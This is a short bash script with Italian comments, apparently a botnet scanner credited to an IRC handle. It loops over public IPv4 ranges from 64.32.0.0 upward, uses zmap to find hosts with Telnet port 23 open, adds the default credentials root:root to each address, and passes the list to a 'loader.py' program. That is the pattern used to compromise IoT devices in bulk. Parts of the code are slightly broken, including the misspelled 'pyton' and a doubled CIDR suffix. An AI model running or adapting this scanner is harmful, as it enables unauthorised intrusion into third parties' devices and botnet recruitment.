#!/bin/bash
###########################################################
##### ---.: ScaNNeR [koro@k0r0.eu] :. IRCn3T #koro    #####
###########################################################
# Definisci l'intervallo degli IP da esaminare
start_ip="64.32.0.0"
end_ip="64.100.255.255"

current_ip=$start_ip

while [ "$(printf '%s\n' "$current_ip" "$end_ip" | sort -V | head -n 1)" != "$end_ip" ]; do
    ip_range="$current_ip/16"

    # 1] Inizio scanner
    zmap -p23 "$ip_range/8" -o bios.txt 
echo ' Converto bios.txt con list '
    # 2] Converti il file bios.txt con sed
    sed 's/$/:23 root:root/' bios.txt >> lista1

    # 3] Starta il tuo programma
    pyton loader.py lista1

    # 4] Elimina i file prima di iniziare un altro range
    rm -rf bios.txt lista1

    # Incrementa il secondo numero del range per il prossimo range
    current_ip=$(printf '%s\n' "$current_ip" | awk -F'.' '{print $1,$2+1,$3,$4}' OFS='.' | tr ' ' '.')

    # Aspetta qualche secondo prima di passare al prossimo range (opzionale)
    sleep 2
done
